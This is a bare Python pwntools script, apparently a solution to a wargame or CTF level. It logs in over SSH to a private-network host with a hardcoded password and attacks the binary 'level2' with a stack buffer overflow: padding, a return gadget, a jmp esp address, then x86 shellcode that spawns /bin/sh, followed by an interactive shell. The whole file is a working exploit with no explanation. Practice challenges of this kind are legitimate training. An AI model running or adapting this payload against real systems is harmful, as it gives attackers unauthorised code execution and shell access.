from pwn import *

s = ssh(host='192.168.1.45', port=4242, user="level2", password="53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77")
p = s.process("/home/user/level2/./level2")

shellcode   = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
jmp_esp     = int("0xb7e2ea55", 16)
ret_op      = int("0x0804853e", 16)

payload = b''
payload += b'A' * (80 - len(payload))
payload += p32(ret_op, endianness="little")
payload += p32(jmp_esp, endianness="little")
payload += shellcode

p.sendline(payload)
p.interactive()
